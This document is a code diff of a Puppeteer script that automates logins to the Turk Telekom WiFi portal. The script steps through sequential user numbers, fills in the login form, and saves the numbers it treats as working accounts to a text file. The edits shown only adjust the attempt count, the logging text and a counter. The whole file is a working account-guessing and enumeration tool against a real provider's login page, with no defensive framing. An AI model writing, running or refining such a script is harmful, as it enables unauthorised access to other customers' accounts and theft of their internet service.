@@ -2,7 +2,7 @@ const puppeteer = require("puppeteer");
 const fs = require("fs");
 
 var user = 2110000;
-var howManyTrys = 1000;
+var howManyTrys = 100;
 
 var accountFound = false;
 const url = "https://giris.turktelekomwifi.com/#/";
@@ -25,7 +25,7 @@ async function findInternet(){
 
 	while (howManyTrys !== 0) {
 
-	await navigateSite(page);
+		await navigateSite(page);
         await fillForm(page);	
         await exitAccount(page);
         await showQuota(page);
@@ -101,9 +101,10 @@ async function fillForm(page){
 		    await page.waitForSelector(login_Button,{timeout:15000});
 		    await page.click(login_Button);
 		} catch (error) {
-			console.log("account found!");
+			console.log("Account found!");
 			fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
 			accountFound = true;
+			user -= 1;
 		}
 	}
 }
